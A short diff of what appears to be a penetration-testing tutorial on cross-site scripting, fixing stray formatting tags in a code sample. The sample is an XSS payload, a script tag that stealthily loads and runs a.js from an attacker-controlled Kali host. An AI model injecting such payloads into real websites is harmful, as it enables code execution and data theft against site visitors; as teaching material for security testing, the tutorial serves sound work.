@@ -52,7 +52,7 @@ I personally like to build a malicious URL that points to an existing Javascript
 
 We won't need to spend much time on this one. All we need to do is specify a source file (which we'll call <code>a.js</code>) in the XSS exploit. And to stay stealthy, we won't cause a visible <code>alert</code> anymore. Here's what we get:
 
-<code>&#60;script src="http://</b>[your_Kali_IP]<b>:9999/a.js"&#62;&#60;/script&#62;</code>
+<code>&#60;script src="http://[your_Kali_IP]:9999/a.js"&#62;&#60;/script&#62;</code>
 
 When this script gets executed, it will try to pull the "a.js" file from your Python web server root, then will execute any code in that file.
 
